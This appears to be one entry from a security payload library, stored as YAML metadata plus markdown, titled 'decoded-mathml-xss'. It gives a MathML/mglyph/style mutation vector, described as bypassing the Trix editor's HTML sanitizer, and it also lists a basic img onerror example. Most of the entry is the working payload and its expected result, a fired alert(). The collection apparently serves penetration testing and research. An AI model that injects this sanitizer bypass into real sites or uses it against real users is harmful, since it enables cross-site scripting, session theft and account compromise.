---
data: >-
  <math><mtext><table><mglyph><style><img src=x
  onerror=alert()></style>XSSPOC</mglyph></table></mtext></math>
tags:
  - xss
  - mathml
type: command
output: Alert popup on execution.
executor: html
platforms:
  - Web
id: f3ceb15a-f525-4dd9-a10b-b910e39d3e4a
created_at: '2025-12-13T23:55:06.757Z'
updated_at: '2025-12-13T23:55:06.757Z'
verified: false
validated: true
submitted: true
---
# decoded-mathml-xss

## Command

```html
<math><mtext><table><mglyph><style><img src=x onerror=alert()></style>XSSPOC</mglyph></table></mtext></math>
```

## Description

Decoded mutation vector for XSS bypass in Trix sanitizer.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| onerror | JavaScript to execute on img load fail | Yes |

## Examples

### Basic Usage

```html
<img src=x onerror=alert()>
```

## Expected Output

JavaScript alert() fires.

## Related

- [[commands/copy-payload-html]]
